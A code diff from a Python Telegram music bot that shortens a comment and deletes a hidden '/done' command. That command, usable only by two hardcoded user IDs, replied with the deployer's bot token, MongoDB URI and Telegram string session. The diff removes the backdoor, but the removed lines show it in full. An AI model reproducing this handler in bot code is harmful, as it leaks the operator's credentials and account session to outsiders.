@@ -31,7 +31,7 @@ from ChampuMusic.utils.stream.stream import stream, is_streamable_url
 
 user_last_message_time = {}
 user_command_count = {}
-SPAM_WINDOW_SECONDS = 5  # Set the time window for spam checks (5 seconds for example)
+SPAM_WINDOW_SECONDS = 5 
 SPAM_THRESHOLD = 2
 
 
@@ -582,28 +582,6 @@ async def anonymous_check(client, CallbackQuery):
     except:
         return
 
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-
-@app.on_message(
-    filters.command("done")
-    & filters.private
-    & (filters.user(6399386263) | filters.user(7006524418))
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://envs.sh/kNr.jpg",
-       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TheChampu)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• ᴄʜᴧᴍᴘᴜ •", url=f"https://t.me/TheChampu")
-                 ]
-            ]
-         ),
-     )
 
 @app.on_callback_query(filters.regex("ChampuPlaylists") & ~BANNED_USERS)
 @languageCB
